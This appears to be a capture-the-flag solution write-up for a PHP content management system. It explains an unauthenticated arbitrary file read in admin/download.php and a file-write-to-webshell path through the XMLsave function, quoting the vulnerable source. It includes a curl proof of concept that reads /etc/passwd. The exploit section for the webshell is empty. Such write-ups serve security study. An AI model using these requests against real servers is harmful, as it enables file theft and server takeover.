# Solutions of web2

#### Anyfile reader / SSRF (UnAuthed)

> Vulnerability

```
>>> WEBROOT/admin/download.php

1	<?php 
2	
3	 
4	// Setup inclusions
5	$load['plugin'] = true;
6	
7	// Include common.php
8	include('inc/common.php');
9	
10	# check if all variables are set
11	if(isset($_GET['file'])) {
12		
13		
14		$file = removerelativepath($_GET['file']);
15	
16		$extention = pathinfo($file,PATHINFO_EXTENSION);
17		header("Content-disposition: attachment; filename=".$file);
18		
19		# set content headers
20		if ($extention == 'gz') {
21			header("Content-type: application/x-gzip");
22		} elseif ($extention == 'mpg') {
23			header("Content-type: video/mpeg");
24		} elseif ($extention == 'jpg' || $extention == 'jpeg' ) {
25			header("Content-type: image/jpeg");
26		} elseif ($extention == 'txt' || $extention == 'log' ) {
27			header("Content-type: text/plain");
28		} elseif ($extention == 'xml' ) {
29			header("Content-type: text/xml");
30		} elseif ($extention == 'js' ) {
31			header("Content-type: text/javascript");
32		} elseif ($extention == 'pdf' ) {
33			header("Content-type: text/pdf");
34		} elseif ($extention == 'css' ) {
35			header("Content-type: text/css");
36		} else {
37	        header("Content-type: application/octet-stream");
38	    }
39		
40		# plugin hook
41		exec_action('download-file');
42		
43		# get file
44		if (file_exists($file)) {		
45			readfile($file, 'r');
46		}
47		exit;
48		
49	} else {
50		echo 'No such file found';
51		die;
52	}
53	
54	exit;#   
```

> Proof of Concept

```
curl http://localhost/admin/download.php?file=/etc/passwd
```


#### File write to getshell

> Vulnerability
```
>>> WEBROOT/admin/changedata.php // This file call the vulnerability function named xmlsave

172			if (isset($_POST['autosave']) && $_POST['autosave'] == 'true' && $autoSaveDraft == true) {
173				$status = XMLsave($xml, GSAUTOSAVEPATH.$url);
174			} else {
175				$status = XMLsave($xml, $file);
176			}

// By the way, the arg: $xml is under control

36			redirect("edit.php?upd=edit-error&type=".urlencode(i18n_r('CANNOT_SAVE_EMPTY')));
37		}	else {
38			
39			$url="";$title="";$metad=""; $metak="";	$cont="";
40			
41			// is a slug provided?
42			if ($_POST['post-id']) { 
--
88			$file = GSDATAPAGESPATH . $url .".xml";
89			
90			// format and clean the responses
91			if(isset($_POST['post-title'])) 			{	$title = var_out(xss_clean($_POST['post-title']));	}
92			if(isset($_POST['post-metak'])) 			{	$metak = safe_slash_html(strip_tags($_POST['post-metak']));	}
93			if(isset($_POST['post-metad'])) 			{	$metad = safe_slash_html(strip_tags($_POST['post-metad']));	}
94			if(isset($_POST['post-author'])) 			{	$author = safe_slash_html($_POST['post-author']);	}
--
133			$xml->addChild('pubDate', date('r'));
134	
135			$note = $xml->addChild('title');
136			$note->addCData($title);
137			
138			$note = $xml->addChild('url');
139			$note->addCData($url);


>>> WEBROOT/admin/inc/basic.php // Defination of function

280	/**
281	 * XML Save
282	 *
283	 * @since 2.0
284	 * @todo create and chmod file before ->asXML call (if it doesnt exist already, if so, then just chmod it.)
285	 *
286	 * @param object $xml
287	 * @param string $file Filename that it will be saved as
288	 * @return bool
289	 */
290	function XMLsave($xml, $file) {
291		# get_execution_time(true);
292		if(!is_object($xml)){
293			debugLog(__FUNCTION__ . ' failed to save xml');
294			return false;
295		}	
296		$data = @$xml->asXML();
297		if(getDef('GSFORMATXML',true)) $data = formatXmlString($data); // format xml if config setting says so
298		$data = exec_filter('xmlsave',$data); // @filter xmlsave executed before writing string to file
299		$success = file_put_contents($file, $data); // LOCK_EX ?
300		
301		// debugLog('XMLsave: ' . $file . ' ' . get_execution_time());	
302		if(getDef('GSDOCHMOD') === false) return $success;
303		if (defined('GSCHMOD')) {
304			return $success && chmod($file, GSCHMOD);
305		} else {
306			return $success && chmod($file, 0755);
307		}
308	}

```



> Exploit

```
```

